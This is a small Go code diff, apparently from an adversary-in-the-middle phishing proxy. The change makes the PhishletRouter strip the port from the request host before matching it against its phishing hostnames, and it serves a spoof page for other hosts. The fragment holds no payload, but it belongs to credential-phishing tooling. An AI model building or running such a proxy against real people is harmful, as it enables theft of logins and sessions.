@@ -26,7 +26,7 @@ type PhishletRouter struct {
 func (h *PhishletRouter) Name() string { return "PhishletRouter" }
 
 func (h *PhishletRouter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
-	hostname := strings.ToLower(req.Host)
+	hostname := hostWithoutPort(strings.ToLower(req.Host))
 	if !h.Hostnames.Contains(hostname) {
 		h.Spoof.ServeHTTP(ctx.ResponseWriter, req)
 		return proxy.ErrShortCircuit
